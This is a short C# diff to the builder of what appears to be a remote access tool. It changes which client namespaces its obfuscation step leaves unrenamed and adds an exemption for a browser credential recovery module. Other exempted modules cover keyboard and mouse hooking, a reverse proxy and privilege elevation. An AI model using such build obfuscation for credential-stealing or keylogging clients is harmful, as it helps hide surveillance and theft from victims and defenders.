@@ -56,14 +56,14 @@ namespace xServer.Core.Build
 
         private void RenameInType(TypeDefinition typeDef)
         {
-            if (typeDef.Namespace == "xClient.Core"
-                || typeDef.Namespace.StartsWith("xClient.Core.Elevation")
+            if (typeDef.Namespace.StartsWith("xClient.Core.Elevation")
                 || typeDef.Namespace.StartsWith("xClient.Core.Compression")
                 || typeDef.Namespace.StartsWith("xClient.Core.Networking")
                 || typeDef.Namespace.StartsWith("xClient.Core.NetSerializer")
                 || typeDef.Namespace.StartsWith("xClient.Core.ReverseProxy")
                 || typeDef.Namespace.StartsWith("xClient.Core.MouseKeyHook")
                 || typeDef.Namespace.StartsWith("xClient.Core.Packets")
+                || typeDef.Namespace.StartsWith("xClient.Core.Recovery.Browsers")
                 || typeDef.HasInterfaces)
                 return;
 
